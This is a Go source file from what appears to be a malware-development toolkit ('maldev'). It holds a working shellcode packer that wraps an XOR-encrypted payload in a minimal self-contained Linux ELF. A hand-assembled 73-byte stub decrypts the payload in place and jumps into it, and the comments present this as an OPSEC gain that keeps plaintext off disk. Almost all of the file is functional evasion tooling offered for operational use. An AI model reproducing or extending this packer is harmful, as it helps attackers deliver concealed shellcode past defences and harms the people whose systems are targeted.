package packer

import (
	"encoding/binary"
	"fmt"

	"github.com/oioio-space/maldev/pe/packer/transform"
)

// Bundle-as-executable: minimal stub asm + minimal ELF wrapper. The
// produced binary is a few hundred bytes total — no Go runtime, no
// dynamic linker, no on-disk plaintext for the matching payload until
// it gets XOR-decrypted into the stub's own page (which is RWX) at
// startup.
//
// This sits next to the higher-level `cmd/bundle-launcher` Go-runtime
// approach (~5 MB binary, full Go runtime + memfd+execve dispatch).
// The all-asm path trades operator ergonomics (no Negate / no full
// fingerprint loop in v0.69) for binary size and OPSEC.

// bundleStubAlwaysIdx0 returns the stub bytes for the simplest possible
// runtime path: ignore the fingerprint table entirely and always
// XOR-decrypt + JMP into PayloadEntry[0].
//
// Operationally this is what `BundleFallbackBehaviour=BundleFallbackFirst`
// asks for in the spec. The full evaluator loop ships in v0.69+; this
// baseline proves the wrap mechanics (RIP-relative bundle addressing,
// PayloadEntry indexing, in-place XOR, dispatch) and gives us a
// concrete byte target for size assertions.
//
// Asm flow (bundle base resolved via call/pop PIC trick):
//
//	  call .pic              ; push RIP (= .pic label) and jump
//	.pic:
//	  pop  r15               ; r15 = .pic = stub base + 5
//	  add  r15, BUNDLE_OFF   ; r15 = bundle base (BUNDLE_OFF = stubLen - 5)
//	  mov  ecx, [r15 + 12]   ; ecx = plTableOff (BundleHeader[12:16])
//	  add  rcx, r15          ; rcx = &PayloadEntry[0]
//	  mov  edi, [rcx]        ; edi = DataRVA
//	  add  rdi, r15          ; rdi = data ptr
//	  mov  esi, [rcx + 4]    ; esi = DataSize
//	  lea  r8,  [rcx + 16]   ; r8 = key ptr (16 bytes)
//	  xor  r9d, r9d          ; r9 = byte counter
//	.decrypt:
//	  test esi, esi
//	  jz   .jmp_payload
//	  mov  al,  [rdi]
//	  mov  dl,  r9b
//	  and  dl,  15
//	  movzx edx, dl          ; edx = counter % 16
//	  xor  al,  [r8 + rdx]
//	  mov  [rdi], al
//	  inc  rdi
//	  inc  r9d
//	  dec  esi
//	  jmp  .decrypt
//	.jmp_payload:
//	  mov  edi, [rcx]        ; rewind rdi to start
//	  add  rdi, r15
//	  jmp  rdi
//
// Total: 73 bytes. The 4-byte BUNDLE_OFF immediate at file offset 10
// gets patched by [WrapBundleAsExecutableLinux] once the stub length
// is known.
func bundleStubAlwaysIdx0() []byte {
	return []byte{
		// call .pic
		0xe8, 0x00, 0x00, 0x00, 0x00,
		// pop r15
		0x41, 0x5f,
		// add r15, imm32  (imm32 at bytes 10..13 — patched at wrap time)
		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,
		// mov ecx, [r15+12]
		0x41, 0x8b, 0x4f, 0x0c,
		// add rcx, r15
		0x4c, 0x01, 0xf9,
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// mov esi, [rcx+4]
		0x8b, 0x71, 0x04,
		// lea r8, [rcx+16]
		0x4c, 0x8d, 0x41, 0x10,
		// xor r9d, r9d
		0x45, 0x31, 0xc9,
		// .decrypt:
		// test esi, esi
		0x85, 0xf6,
		// jz +0x1b → .jmp_payload
		0x74, 0x1b,
		// mov al, [rdi]
		0x8a, 0x07,
		// mov dl, r9b
		0x44, 0x88, 0xca,
		// and dl, 15
		0x80, 0xe2, 0x0f,
		// movzx edx, dl
		0x0f, 0xb6, 0xd2,
		// xor al, [r8 + rdx*1]
		0x41, 0x32, 0x04, 0x10,
		// mov [rdi], al
		0x88, 0x07,
		// inc rdi
		0x48, 0xff, 0xc7,
		// inc r9d
		0x41, 0xff, 0xc1,
		// dec esi
		0xff, 0xce,
		// jmp .decrypt  (back -0x1f bytes)
		0xeb, 0xe1,
		// .jmp_payload:
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// jmp rdi
		0xff, 0xe7,
	}
}

// bundleOffsetImm32Pos is the byte offset of the patchable imm32
// inside [bundleStubAlwaysIdx0]'s output — i.e. the "BUNDLE_OFF"
// operand of `add r15, imm32`. Exposed so tests + the wrap helper
// agree on the layout.
const bundleOffsetImm32Pos = 10

// WrapBundleAsExecutableLinux composes a runnable Linux x86-64 ELF
// from a bundle blob. Layout:
//
//	[ELF Ehdr (64 B) | PT_LOAD Phdr (56 B) | stub asm (~73 B) | bundle blob]
//
// Steps:
//
//  1. Emit the always-idx-0 stub (the fingerprint evaluator extension
//     ships in a follow-up commit; this is the baseline that proves
//     the wrap mechanics).
//  2. Patch the stub's `add r15, BUNDLE_OFF` immediate with the byte
//     distance from the .pic label (5 bytes into the stub) to the
//     bundle's first byte. Equivalent to `len(stub) - 5`.
//  3. Concatenate stub + bundle.
//  4. Wrap in [transform.BuildMinimalELF64].
//
// The result is a self-contained ELF — no PT_INTERP, no DT_NEEDED, no
// imports. The kernel maps it RWX and jumps to entry; the stub
// resolves the bundle base via call/pop PIC, locates PayloadEntry[0],
// XOR-decrypts the data in place, and JMPs to it. The decrypted bytes
// must therefore be raw position-independent shellcode (NOT a packed
// PE/ELF — those need the cmd/bundle-launcher reflective path).
//
// Today's limitation: always selects payload 0 regardless of fingerprint
// matching. Equivalent to the spec's `BundleFallbackFirst`. The full
// CPUID + PEB evaluator loop ships in the next stub revision and
// drops in transparently — this function's signature does not change.
func WrapBundleAsExecutableLinux(bundle []byte) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < BundleHeaderSize %d",
			ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != BundleMagic {
		return nil, fmt.Errorf("%w: %#x != %#x",
			ErrBundleBadMagic, magic, BundleMagic)
	}

	stub := bundleStubAlwaysIdx0()
	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)

	combined := make([]byte, 0, len(stub)+len(bundle))
	combined = append(combined, stub...)
	combined = append(combined, bundle...)

	return transform.BuildMinimalELF64(combined)
}
